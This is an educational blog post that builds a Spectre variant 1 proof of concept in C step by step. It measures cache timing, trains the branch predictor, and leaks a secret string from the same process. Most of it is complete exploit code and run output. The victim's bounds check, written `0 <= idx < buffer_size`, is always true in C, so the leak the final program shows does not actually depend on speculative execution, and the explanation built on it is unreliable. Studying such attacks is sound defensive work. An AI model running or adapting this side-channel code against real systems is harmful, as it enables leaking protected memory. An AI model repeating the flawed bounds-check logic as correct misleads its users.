---
title: "Building a PoC for Spectre"
date: 2018-01-25 22:28:14
last_modified_at: 2024-06-04 11:37:10
author: "Pixis"
layout: post
permalink: /construction-poc-spectre/
disqus_identifier: 0000-0000-0000-001f
cover: assets/uploads/2018/01/spectre_poc.png
description: "Today, we're going to build a proof of concept of the Spectre attack to put into practice the theory of this attack presented in the previous article."
tags:
  - "User Land"
  - Linux
  - Hardware
translation:
  fr: 
---

Today, we're going to build a proof of concept (PoC - *Proof of Concept*) of the Spectre attack in order to put into practice the theory of this attack presented in the article [Meltdown and Spectre](/meltdown-spectre).

This article requires knowledge of the C programming language to be able to follow along.

<!--more-->

## Introduction

The development of this example will proceed in four parts.

1. The first will highlight the access time to main memory when we access memory areas that are not in the cache.
2. We will then see the difference in access time between a cached memory area and a non-cached one.
3. The caching of a memory area during branch prediction will be highlighted.
4. We will finish by disclosing a secret intrinsic to the program that we could never have discovered without using this technique.

## PoC of RAM access time

The structure of the program will evolve with the chapters. Here, we will develop a simple program that will initialize a buffer of 256 pages, remove it from the cache, and we will access all the pages of this buffer by measuring the number of clock cycles elapsed before and after the access to each memory area.

The program will therefore have the following structure

```c
/* Initialization of the 256-page buffer */
char paged_buffer[256 * PAGE_SIZE];

/* Calculation of the access time to a page of the buffer */
uint32_t get_index_access_time(int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // We remove the page from all cache levels

    int before = __rdtsc(); // Returns the current clock cycle count
    access(paged_buffer[value * PAGE_SIZE]); // Access to the memory area
    int after  = __rdtsc(); // Returns the clock cycle count after the memory access
    return after - before; // We return the difference to get the access time
}

int main(void) {
    /* For all pages of the buffer, we calculate the access time */
    for(int i = 0; i < 256; i++) {
        printf("%c: %u\n",i, get_index_access_time(i));
    }
}
```

This simplified code makes it possible to understand the idea we are trying to show. All pages are removed from the cache, then we measure the number of clock cycles needed to access each of these pages. The order of magnitude for accessing a page in memory is 300 clock cycles, while when it is in cache, it is less than 80 clock cycles.

The complete and functional program will average over 100 accesses, in order to avoid false positives. Here it is:

**poc_no_cache.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100

volatile char paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

void access_value(uint32_t x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

uint32_t get_index_access_time(int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;

    /* Retrieve the index of the page we're accessing */
    value *= PAGE_SIZE;
    
    /* Loop to average over COUNT accesses */
    for(int i = 0; i < COUNT; i++) {

        /* Cache flush */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }

        int before, after;

        before = __rdtsc(); // Returns the current clock cycle count
        access_value(paged_buffer[value]); // Access to the page
        _mm_lfence(); // Prevents 'after' from being retrieved before 'access_value' finishes
        after = __rdtsc(); // Returns the current clock cycle count

        uint32_t diff = (uint32_t)(after-before); // Number of cycles for the access to the memory area

        access_time += diff;
        
        /*
         * If the access time was greater than 80 cycles, then we consider that the memory range
         * was in RAM
         * Otherwise, it was probably in the cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }

    /* If there were more cases in cache than in RAM, we add a green asterisk */
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time() {
    /*
     * For all pages of the buffer, we calculate the access time
     * CACHE: Number of times the clock cycle count was < 80
     * MEM: Number of times the clock cycle count was > 80
     * CYCLES: Average number of clock cycles for the access
     * HIT: Indicates whether, on average, we found that the variable was in cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");
    for(int i = 0; i < 256; i++) {
        printf("%c: %u\n",i, get_index_access_time(i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Prevents an optimization called lazy allocation */
    }

    get_all_access_time();
    
    return 0;
}
```

This program, well supplied with comments, is functional. Here is a preview of the result when it is compiled without optimization

```
pixis@hackndo:~/spectre$ gcc -O0 poc_no_cache.c -o poc_no_cache && ./poc_no_cache
    CACHE MEM CYCLES    HIT
---------------------------
[...]
[ ]    0  100   291 - o: 0
[ ]    0  100   287 - p: 0
[ ]    1   99   271 - q: 0
[ ]    1   99   272 - r: 0
[ ]    0  100   304 - s: 0
[ ]    0  100   268 - t: 0
[ ]    0  100   272 - u: 0
[ ]    0  100   278 - v: 0
[ ]    0  100   284 - w: 0
[...]
```

We can see that the average number of clock cycles required to access a page is around 200 or 300 cycles, and that the vast majority of trials indicate that the accesses are in RAM, except for a few very rare false positives (2 false positives out of 900 attempts in the excerpt above).

It is now time to highlight the benefit of caching on this type of access.

## PoC demonstrating caching

To demonstrate caching, we'll extend the simplified code from the first example. We were flushing the cache before each memory access, whereas now, we'll choose a memory page, and after flushing the cache, we'll access this page before measuring the access time. Thus, by accessing this page, the processor will cache it, and the access time we'll then calculate will be faster for this area.

So all we need to do is add a memory access for an index just after flushing the cache. The minimal code becomes this:

```c
/* Initialization of the 256-page buffer */
char paged_buffer[256 * PAGE_SIZE];

/* Calculation of the access time to a page of the buffer */
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // We remove the page from all cache levels


    /* This is where we add an access to an index defined in main(), 'H' or 72 in our example */
    access(paged_buffer[idx * PAGE_SIZE])

    int before = __rdtsc(); // Returns the current clock cycle count
    access(paged_buffer[value * PAGE_SIZE]); // Access to the memory area
    int after  = __rdtsc(); // Returns the clock cycle count after the memory access
    return after - before; // We return the difference to get the access time
}

int main(void) {
    /* For all pages of the buffer, we calculate the access time */
    for(int i = 0; i < 256; i++) {
        /* The first argument is the index we will cache */
        printf("%c: %u\n",i, get_index_access_time('H', i)); // 'H' is a char that corresponds to 72 in ASCII
    }
}
``` 

If you've understood this shortened code, it will allow you to better understand the difference between the following program and the one we saw in the absence of caching.

**poc_cache.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;


void access_value(uint32_t x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

void delay() {
    /* Does nothing except let time pass */
    uint32_t x = 0x1234;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 123;
        x *= 173;
    }
}

uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;

    /* Retrieve the index of the page we're accessing */
    value *= PAGE_SIZE;
    idx *= PAGE_SIZE;
    
    /* Loop to average over COUNT accesses */
    for(int i = 0; i < COUNT; i++) {

        /* Cache flush */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }

        access_value(paged_buffer[idx]); // Access to the page

        /* We ensure that the access is complete before continuing */
        _mm_lfence();
        delay();

        int before, after;

        before = __rdtsc(); // Returns the current clock cycle count
        access_value(paged_buffer[value]); // Access to the page
        _mm_lfence(); // Prevents 'after' from being retrieved before 'access_value' finishes
        after = __rdtsc(); // Returns the current clock cycle count

        uint32_t diff = (uint32_t)(after-before); // Number of cycles for the access to the memory area

        access_time += diff;
        
        /*
         * If the access time was greater than 80 cycles, then we consider that the memory range
         * was in RAM
         * Otherwise, it was probably in the cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /*
     * For all pages of the buffer, we calculate the access time
     * CACHE: Number of times the clock cycle count was < 80
     * MEM: Number of times the clock cycle count was > 80
     * CYCLES: Average number of clock cycles for the access
     * HIT: Indicates whether, on average, we found that the variable was in cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");

    /* We reduce the range for the example, since only 'H' interests us */
    for(int i = 'A'; i <= 'Z'; i++) {
        printf("%c: %u\n",i, get_index_access_time(idx, i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Prevents an optimization called lazy allocation */
    } 

    get_all_access_time('H'); // 'H' is a char that corresponds to 72 in ASCII
    
    return 0;
}
```

Here, then, is a functional program that caches a page at index 72 (represented by 'H' in ASCII). We have reduced the loop that traverses the page array because we are only interested in the caching of index 72. The program's output is as follows:

```
pixis@hackndo:~/spectre$ gcc -O0 poc_cache.c -o poc_cache && ./poc_cache
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   265 - A: 0
[ ]    0  100   262 - B: 0
[ ]    0  100   279 - C: 0
[ ]    0  100   281 - D: 0
[ ]    0  100   271 - E: 0
[ ]    0  100   277 - F: 0
[ ]    0  100   272 - G: 0
[*]  100    0    38 - H: 1
[ ]    0  100   262 - I: 0
[ ]    0  100   286 - J: 0
[ ]    0  100   278 - K: 0
[ ]    0  100   262 - L: 0
[ ]    0  100   270 - M: 0
[ ]    0  100   292 - N: 0
[ ]    0  100   280 - O: 0
[ ]    0  100   272 - P: 0
[ ]    0  100   329 - Q: 0
[ ]    0  100   702 - R: 0
[ ]    0  100   279 - S: 0
[ ]    0  100   256 - T: 0
[ ]    0  100   285 - U: 0
[ ]    0  100   268 - V: 0
[ ]    0  100   290 - W: 0
[ ]    0  100   277 - X: 0
[ ]    1   99   262 - Y: 0
[ ]    0  100   262 - Z: 0
```

Index 72 (or 'H') has indeed been cached. We can see this because the average over 100 accesses is 38 clock cycles, and the 100 accesses took less than 80 cycles, as shown by the 'CACHE' column.

Now that we are able to know the index of the array page that was cached, it's time to see that prediction will produce the same result, even though we don't normally execute the code because the branch shouldn't be taken.

## PoC of caching by prediction

To put this example into practice, we will imagine a (somewhat) real case. Our program will be divided into two parts.

The first part will represent a target, victim program that only offers its users one function. This function makes it possible to access the pages of a buffer using the variables of another buffer. The function made available is the following:

```c
/* Controlled buffer, with values between 0 and 255 */
int buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* A value absolutely inaccessible with the single function below */
char * secret = "SECRET";

int x;
void my_protected_function(int idx) {
    /*
     * The function checks that the index provided as parameter is indeed within the bounds of
     * this program's array. The "buffer" array is initialized/controlled by this program, so
     * the values are controlled such that 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}
```

An attacker having access only to this function should not, in principle, be able to do a buffer overflow to try to get information out that is not in the `buffer` array. In particular, the contents of the `secret` variable seem unreachable.

The attacker will use the vulnerability presented in the article on [Meltdown and Spectre](/meltdown-spectre) which explains in a nutshell that they can train the processor to take a branch on a condition, then, with optimization in mind, this processor will execute the contents of the branch in question the next time it encounters the condition, before even having verified the condition's validity. Of course, if the condition turns out to be false, the processor will cancel its actions, but without erasing the caching.

The attacker will therefore train the processor to enter the condition of the victim's function, so accustom it to the fact that `0 <= idx < buffer_size`, then once the processor is well-trained, the attacker will provide it with a value that is not at all in this interval.

Here is the simplified code completed to perform this operation:

```c
/* Initialization of the 256-page buffer */
char paged_buffer[256 * PAGE_SIZE];

/* The program will train the processor 10 times to take the branch, then will change the index */
#define TRAIN 10
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // We remove the page from all cache levels

    /* A valid index is used for training */
    int valid_idx = 2;
    for(int i = 0; i < TRAIN; i++) {
        my_protected_function(valid_idx);
    }

    /*
     * Then we access a memory area that is no longer normally allowed
     * We will use a carefully chosen index so that the memory area accessed
     * is the first byte of the secret
     */
    my_protected_function(evil_idx);

    /*
     * The branch prediction should have read the value of the first byte of the secret 'S' or 83 in decimal,
     * then had to access the index of the page array, caching the page at index 83.
     * Since the processor realizes its mistake, the changes are cancelled, but the
     * caching still exists. So we'll be able to measure access times to find this famous
     * value.
     * This training must be done for each byte tested in the loop of the main function
     * When the loop is at 83 or 'S', the following instructions will show that the value is in cache
     * We will then know that the first byte of the secret is an 'S'
     */

    int before = __rdtsc(); // Returns the current clock cycle count
    access(paged_buffer[value * PAGE_SIZE]); // Access to the memory area
    int after  = __rdtsc(); // Returns the clock cycle count after the memory access
    return after - before; // We return the difference to get the access time
}

int main(void) {
    /* For all pages of the buffer, we calculate the access time */
    for(int i = 'A'; i <= 'Z'; i++) {
        /* The first argument is the index used to reach the first byte of the secret */
        int evil_idx = 0x12bb36f1; // Random example, this is to simplify the code
        printf("%c: %u\n",i, get_index_access_time(evil_idx, i));
    }
}

```

I have added many comments to understand how the attack works in this program. Normally, these comments are enough to understand the program. Carrying them over into a functional code, and adding details, here is the complete program:

**poc_leak_one_byte.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16



/**
 ** VICTIM CODE
 **/

volatile uint32_t buffer_size = BUFFER_SIZE;

/* Controlled buffer, with values between 0 and 255 */
volatile uint8_t buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* A value absolutely inaccessible with the single function below */
char * secret = "SECRET";

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

int x;
void my_protected_function(int idx) {
    /*
     * The function checks that the index provided as parameter is indeed within the bounds of
     * this program's array. The "buffer" array is initialized/controlled by this program, so
     * the values are controlled such that 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** ATTACKER CODE
 **/

void access_value(uint32_t x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

void delay() {
    /* Does nothing except let time pass */
    uint32_t x = 0x1337;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 444;
        x *= 555;
    }
}

#define TRAIN 30
#define FREQ 5
uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;
    uint32_t diff = 0;

    /* Retrieve the index of the page we're accessing */
    value *= PAGE_SIZE;

    /* Loop to average over COUNT accesses */
    for(int i = 0; i < COUNT; i++) {

        /* Cache flush */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }
        
        /* Index trx that is within the bounds of the array */
        uint32_t trx = idx % buffer_size;

        /* Branch training */
        for(int i = 0; i < TRAIN; i++) {
            /* We remove the array size variable from the cache so that the comparison is slow */
            _mm_clflush((void*)&buffer_size);
            delay();

            /*
             * Trick borrowed from several online PoCs.
             * It allows performing a condition without adding branches.
             * Adding branches risks cancelling the processor's optimization, which would see
             * multiple paths, and therefore wouldn't properly train its branch choice.
             *
             * The equivalent pseudo-code is the following
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Attack index
             * } else {
             *     addr = trx; // Index within the array
             * }
             * 
             * By doing this, again with averaging in mind, every FREQ iteration
             * we're going to try to play on prediction with the secret index as parameter
             * By doing this several times, there should be at least one caching
             */

            int addr = ((i % FREQ)-1) & ~0xffff; // addr = 0xffff0000 if i % FREQ == 0
            addr = (addr | (addr >> 16)); // addr = FFFF if i % FREQ == 0
            addr = trx ^ (addr & (trx ^ idx)); // addr = idx if i % FREQ == 0; otherwise trx

            my_protected_function(addr);
        }

        delay();

        int before, after;

        before = __rdtsc(); // Returns the current clock cycle count
        access_value(paged_buffer[value]); // Access to the page
        _mm_lfence(); // Prevents 'after' from being retrieved before 'access_value' finishes
        after = __rdtsc(); // Returns the current clock cycle count

        uint32_t diff = (uint32_t)(after-before); // Number of cycles for the access to the memory area

        access_time += diff;
        
        /*
         * If the access time was greater than 80 cycles, then we consider that the memory range
         * was in RAM
         * Otherwise, it was probably in the cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }
    
    if(in_cache > in_ram)
        printf("[" GREEN "*" RESET "] ");
    else
        printf("[ ] ");
    printf("% 4i % 4i % 5i - ", in_cache, in_ram, access_time / COUNT );
    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /*
     * For all pages of the buffer, we calculate the access time
     * CACHE: Number of times the clock cycle count was < 80
     * MEM: Number of times the clock cycle count was > 80
     * CYCLES: Average number of clock cycles for the access
     * HIT: Indicates whether, on average, we found that the variable was in cache
     */
    printf(
        "    CACHE MEM CYCLES    HIT\n"
        "---------------------------\n");

    /* We reduce the range for the example, since only 'H' interests us */
    for(int i = 'A'; i <= 'Z'; i++) {
        printf("%c: %u\n",i, get_index_access_time(idx, i));
    }

}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Prevents an optimization called lazy allocation */
    }

    /*
     * The index we pass as argument will be used as follows:
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * I reminded in the article on meltdown and spectre that
     * buffer[idx]
     * was equivalent to
     * *(buffer + idx)
     * So to access the address of the first byte of secret, we look for
     * secret = buffer + idx
     * so idx = secret - buffer
     * Hence the choice of argument in the following instruction.
     */
    get_all_access_time(secret - (char * ) buffer);
    return 0;
}
```

Once again, this code is heavily commented to explain all the mechanisms and additions for particular cases. The output of this program is:

```
pixis@hackndo:~/spectre$ gcc -O0 poc_leak_one_byte.c -o poc_leak_one_byte && ./poc_leak_one_byte
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   279 - A: 0
[ ]    0  100   292 - B: 0
[ ]    0  100   284 - C: 0
[ ]    0  100   288 - D: 0
[ ]    0  100   285 - E: 0
[ ]    0  100   288 - F: 0
[ ]    0  100   295 - G: 0
[ ]    0  100   284 - H: 0
[ ]    0  100   275 - I: 0
[ ]    0  100   264 - J: 0
[ ]    0  100   284 - K: 0
[ ]    0  100   258 - L: 0
[ ]    0  100   256 - M: 0
[ ]    0  100   267 - N: 0
[ ]    0  100   265 - O: 0
[ ]    0  100   277 - P: 0
[ ]    0  100   282 - Q: 0
[ ]    0  100   303 - R: 0
[*]   99    1    38 - S: 1
[ ]    0  100   275 - T: 0
[ ]    1   99   288 - U: 0
[ ]    0  100   300 - V: 0
[ ]    0  100   282 - W: 0
[ ]    0  100   276 - X: 0
[ ]    0  100   309 - Y: 0
[ ]    0  100   306 - Z: 0
```

The program therefore indicates that the first byte of the secret is an S! We're almost there to finish the job.

## Final PoC to find the secret

The last program is almost complete. All that remains is to loop a certain number of times to get the secret in its entirety.

```c
/**
 ** VICTIM CODE
 **/

/* Controlled buffer, with values between 0 and 255 */
int buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* A value absolutely inaccessible with the single function below */
char * secret = "SECRET";

int x;
void my_protected_function(int idx) {
    /*
     * The function checks that the index provided as parameter is indeed within the bounds of
     * this program's array. The "buffer" array is initialized/controlled by this program, so
     * the values are controlled such that 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** ATTACKER CODE
 **/


/* Initialization of the 256-page buffer */
char paged_buffer[256 * PAGE_SIZE];

/* The program will train the processor 10 times to take the branch, then will change the index */
#define TRAIN 10
uint32_t get_index_access_time(int idx, int value) {
    flush(paged_buffer[value * PAGE_SIZE]); // We remove the page from all cache levels

    /* A valid index is used for training */
    int valid_idx = 2;
    for(int i = 0; i < TRAIN; i++) {
        my_protected_function(valid_idx);
    }

    /*
     * Then we access a memory area that is no longer normally allowed
     * We will use a carefully chosen index so that the memory area accessed
     * is the first byte of the secret
     */
    my_protected_function(evil_idx);

    /*
     * The branch prediction should have read the value of the first byte of the secret 'S' or 83 in decimal,
     * then had to access the index of the page array, caching the page at index 83.
     * Since the processor realizes its mistake, the changes are cancelled, but the
     * caching still exists. So we'll be able to measure access times to find this famous
     * value.
     * This training must be done for each byte tested in the loop of the main function
     * When the loop is at 83 or 'S', the following instructions will show that the value is in cache
     * We will then know that the first byte of the secret is an 'S'
     */

    int before = __rdtsc(); // Returns the current clock cycle count
    access(paged_buffer[value * PAGE_SIZE]); // Access to the memory area
    int after  = __rdtsc(); // Returns the clock cycle count after the memory access
    return after - before; // We return the difference to get the access time
}

int main(void) {
    /* For all pages of the buffer, we calculate the access time */
    int evil_idx = 0x12bb36f1; // Random example, this is to simplify the code

    /* We loop over the length of the secret to reveal it all */
    for(int j = 0; j < secret_length; j++) {
        for(int i = 'A'; i <= 'Z'; i++) {
            /* The first argument is the index used to reach the first byte of the secret */
            printf("%c: %u\n",i, get_index_access_time(evil_idx + j, i)); // We add one each loop to get the entire secret
        }
    }
}
```

The loop is done in the `main` function; we increment the index corresponding to the secret to get the secret in its entirety. It's quite simple to implement with the previous program. Here is what the complete final program looks like:

**poc_final.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16



/**
 ** VICTIM CODE
 **/
volatile uint32_t buffer_size = BUFFER_SIZE;

/* Controlled buffer, with values between 0 and 255 */
volatile uint8_t buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* A value absolutely inaccessible with the single function below */
char * secret = "SECRET";

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

int x;
void my_protected_function(int idx) {
    /*
     * The function checks that the index provided as parameter is indeed within the bounds of
     * this program's array. The "buffer" array is initialized/controlled by this program, so
     * the values are controlled such that 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/**
 ** ATTACKER CODE
 **/
void access_value(uint32_t x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

void delay() {
    /* Does nothing except let time pass */
    uint32_t x = 0x1337;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 444;
        x *= 555;
    }
}

#define TRAIN 30
#define FREQ 5
uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;
    uint32_t diff = 0;

    /* Retrieve the index of the page we're accessing */
    value *= PAGE_SIZE;

    /* Loop to average over COUNT accesses */
    for(int i = 0; i < COUNT; i++) {

        /* Cache flush */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }
        
        /* Index trx that is within the bounds of the array */
        uint32_t trx = idx % buffer_size;

        /* Branch training */
        for(int i = 0; i < TRAIN; i++) {
            /* We remove the array size variable from the cache so that the comparison is slow */
            _mm_clflush((void*)&buffer_size);
            delay();

            /*
             * Trick borrowed from several online PoCs.
             * It allows performing a condition without adding branches.
             * Adding branches risks cancelling the processor's optimization, which would see
             * multiple paths, and therefore wouldn't properly train its branch choice.
             *
             * The equivalent pseudo-code is the following
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Attack index
             * } else {
             *     addr = trx; // Index within the array
             * }
             * 
             * By doing this, again with averaging in mind, every FREQ iteration
             * we're going to try to play on prediction with the secret index as parameter
             * By doing this several times, there should be at least one caching
             */

            int addr = ((i % FREQ)-1) & ~0xffff; // addr = 0xffff0000 if i % FREQ == 0
            addr = (addr | (addr >> 16)); // addr = FFFF if i % FREQ == 0
            addr = trx ^ (addr & (trx ^ idx)); // addr = idx if i % FREQ == 0; otherwise trx

            my_protected_function(addr);
        }

        delay();

        int before, after;

        before = __rdtsc(); // Returns the current clock cycle count
        access_value(paged_buffer[value]); // Access to the page
        _mm_lfence(); // Prevents 'after' from being retrieved before 'access_value' finishes
        after = __rdtsc(); // Returns the current clock cycle count

        uint32_t diff = (uint32_t)(after-before); // Number of cycles for the access to the memory area

        access_time += diff;
        
        /*
         * If the access time was greater than 80 cycles, then we consider that the memory range
         * was in RAM
         * Otherwise, it was probably in the cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }

    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /* We reduce the range for the example, since only 'H' interests us */
    for(int i = 'A'; i <= 'Z'; i++) {
        if (get_index_access_time(idx, i) == 1){
            printf("%c", i);
        }
    }
}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Prevents an optimization called lazy allocation */
    }

    int len = 7;

    /*
     * The index we pass as argument will be used as follows:
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * I reminded in the article on meltdown and spectre that
     * buffer[idx]
     * was equivalent to
     * *(buffer + idx)
     * So to access the address of the first byte of secret, we look for
     * secret = buffer + idx
     * so idx = secret - buffer
     * Hence the choice of argument in the following instruction.
     *
     * The counter is incremented to get all the bytes of the secret
     */
    for (int i=0; i<len; i++) {
        get_all_access_time(secret - (char * ) buffer + i);    
    }
    printf("\n");
    return 0;
}
```

This final PoC makes it possible to retrieve the complete value of the secret. Indeed, by executing it, here is the long-awaited secret:

```
pixis@hackndo:~/spectre$ gcc -O0 poc_final.c -o poc_final && ./poc_final
SECRET
```

You will find all the source code on [my GitHub](https://github.com/Hackndo/spectre-poc){:target="blank"}.

I hope this article helps you see things even more clearly. As usual, feel free to comment or find me on [Discord](https://discord.hackndo.com){:target="blank"} for more information, remarks, corrections, etc.

I wanted to thank [Gynvael](https://twitter.com/gynvael){:target="blank"} for the [live](https://www.youtube.com/watch?v=0o6MoJ2gHHI){:target="blank"} he did on the subject, which allowed me to fill in the missing gaps in order to finish this article.
